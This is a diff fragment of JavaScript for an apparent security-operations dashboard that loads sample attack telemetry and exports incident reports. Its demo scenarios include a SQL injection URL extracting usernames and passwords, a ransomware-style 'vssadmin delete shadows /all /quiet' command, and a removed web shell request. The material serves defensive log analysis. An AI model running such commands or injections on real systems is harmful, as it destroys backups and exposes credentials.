 Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for root from 185.220.101.5 port 41220 ssh2`,
   sqli: `194.26.29.112 - - [17/Sep/2026:08:15:22 +0000] "GET /products?cat=1%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 200 4520 "-" "sqlmap"`,
-  ransom: `2026-09-17 11:20:01 WIN-SRV04 ProcessCreate: cmd.exe /c vssadmin.exe delete shadows /all /quiet`,
-  webshell: `194.26.29.112 - - [17/Sep/2026:09:40:11 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 42 "root"`
+  ransom: `2026-09-17 11:20:01 WIN-SRV04 ProcessCreate: cmd.exe /c vssadmin.exe delete shadows /all /quiet`
 };
 
 function loadSample(type) {
   document.getElementById('logStream').value = SCENARIOS[type] || '';
   updateByteCount();
-  toast('info', 'Scenario Loaded', `${type.toUpperCase()} telemetry loaded.`);
+  toast('info', 'Scenario Loaded', `${type.toUpperCase()} telemetry loaded into console.`);
 }
 
 function quickAnalyze(type) {
@@ -1980,20 +2145,23 @@ function updateByteCount() {
   document.getElementById('byteCount').textContent = new Blob([v]).size + ' bytes';
 }
 function clearAnalyzer() { document.getElementById('logStream').value = ''; updateByteCount(); }
-function clearTerminal() { document.getElementById('termBody').innerHTML = ''; }
-function downloadTerminalLog() {
-  const b = new Blob([document.getElementById('termBody').innerText], { type: 'text/plain' });
-  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'terminal.txt'; a.click();
+function switchExport(tab) {
+  STATE.exportTab = tab;
+  document.querySelectorAll('.tab-btn[data-etab]').forEach(b => b.classList.toggle('active', b.dataset.etab === tab));
+  updateExportOutput();
 }
-function copyPayload() { copyToClipboard(document.getElementById('payloadOutput').textContent); }
-function copyContainment() { copyToClipboard(document.getElementById('containmentOutput').textContent); }
+function updateExportOutput() {
+  const out = document.getElementById('exportContent');
+  if (!STATE.lastReport) return;
+  out.textContent = JSON.stringify(STATE.lastReport, null, 2);
+}
 function copyStix() { copyToClipboard(document.getElementById('exportContent').textContent); }
 function downloadStix() {
   const b = new Blob([document.getElementById('exportContent').textContent], { type: 'application/json' });
-  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'bundle.json'; a.click();
+  const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'secops-bundle.json'; a.click();
 }
-function copyToClipboard(t) {
-  navigator.clipboard.writeText(t).then(() => toast('success', 'Copied', 'Saved to clipboard.'));
+function copyToClipboard(t, msg) {
+  navigator.clipboard.writeText(t).then(() => toast('success', 'Copied', msg || 'Saved to clipboard.'));
 }
 function toast(type, title, msg) {
   const w = document.getElementById('toastWrap');
@@ -2007,23 +2175,23 @@ function addFeedItem(r) {
   const f = document.getElementById('activityFeed');
   const d = document.createElement('div');
   d.className = 'feed-item';
-  d.innerHTML = `<div><div style="font-weight:700;">${r.threat_title}</div><div style="font-size:10px;color:var(--text-2);">${r.severity} · Score: ${r.threat_score}</div></div>`;
+  d.innerHTML = `<div><div style="font-weight:700;">${r.threat_title}</div><div style="font-size:10px;color:var(--text-2);">${r.severity} · Threat Score: ${r.threat_score}</div></div>`;
   f.insertBefore(d, f.firstChild);
 }
 function clearFeed() { document.getElementById('activityFeed').innerHTML = ''; }
-function showNotifications() { toast('info', 'Queue', `${STATE.analyses} incident(s) analyzed.`); }
+function showNotifications() { toast('info', 'Incident Queue', `${STATE.analyses} incident record(s) armed.`); }
 function saveSettings() {
   localStorage.setItem('secops_key', document.getElementById('persistKey').value.trim());
-  toast('success', 'Saved', 'Settings persisted.');
+  toast('success', 'Saved', 'Gemini API Key saved.');
 }
 function resetSettings() { localStorage.removeItem('secops_key'); toast('info', 'Reset', 'Defaults restored.'); }
 function toggleMatrix(v) { if (v === 'off') window.matrixControl.stop(); else window.matrixControl.start(); }
-function openHex() { document.getElementById('hexBody').textContent = document.getElementById('logStream').value || 'No telemetry'; document.getElementById('hexModal').classList.remove('hidden'); }
+function openHex() { document.getElementById('hexBody').textContent = document.getElementById('logStream').value || 'No telemetry in buffer.'; document.getElementById('hexModal').classList.remove('hidden'); }
 function closeHex() { document.getElementById('hexModal').classList.add('hidden'); }
 function printAudit() { window.print(); }
 
 /* ============================================================
-   FAIL-SAFE BOOTSTRAP (RUNS IN ALL ENVIRONMENTS)
+   BOOTSTRAP LOGIC
 ============================================================ */
 function bootstrap() {
   renderAllIcons();
@@ -2061,10 +2229,17 @@ function bootstrap() {
     });
   }
 
-  document.getElementById('feedTime1').textContent = new Date().toLocaleTimeString();
-  termPrint('SecOps-AI Sentinel Terminal Initialized.');
-  termPrint('Type "help" for list of commands.');
-  updateMitre(null);
+  // Pre-load Baseline State
+  document.getElementById('feedTime1') && (document.getElementById('feedTime1').textContent = new Date().toLocaleTimeString());
+  termPrint('SecOps-AI Sentinel OS Shell v2.0 Armed & Ready.', 'info');
+  termPrint('Type "help" or click any command chip below to execute.', 'dim');
+  
+  addFeedItem(INITIAL_BASELINE_SESSION);
+  renderReport(INITIAL_BASELINE_SESSION);
+  updateMitre(INITIAL_BASELINE_SESSION);
+  updateIocs(INITIAL_BASELINE_SESSION);
+  updateContainmentOutput();
+  updateExportOutput();
   generatePayload();
 }
 
